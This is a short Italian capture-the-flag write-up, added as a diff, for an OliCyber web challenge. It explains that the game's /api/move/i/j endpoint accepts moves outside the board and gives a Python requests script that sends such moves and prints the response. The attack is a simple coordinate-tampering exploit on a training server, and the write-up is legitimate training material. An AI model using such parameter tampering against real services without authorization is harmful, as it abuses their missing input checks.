@@ -1,0 +1,13 @@
+ispezionando il ssito si vede che fa richiesta a /api/move/${i}/${j} i e j sono le cordinate quindi semplicemente fare una get alle cordinate fuori lo schema 
+import requests
+
+URL = 'http://trais.challs.olicyber.it/'
+
+s = requests.Session()
+
+s.get(URL)
+s.get(f"{URL}/api/move/2/2")
+s.get(f"{URL}/api/move/2/1")
+text = s.get(f"{URL}/api/move/2/3").text
+print(text)
+
